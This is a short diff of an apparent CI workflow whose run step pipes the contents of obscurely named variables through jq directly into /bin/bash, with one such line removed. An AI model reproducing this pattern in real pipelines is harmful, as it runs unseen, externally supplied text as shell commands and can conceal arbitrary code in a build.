@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$igi760" | jq -r .vl227 | /bin/bash
           printf '%s' "$u5799" | jq -r .xams37494 | /bin/bash
-          printf '%s' "$lkz49" | jq -r .v07 | /bin/bash
           printf '%s' "$qxj53953" | jq -r .zhm0 | /bin/bash
 
       - name: Save results
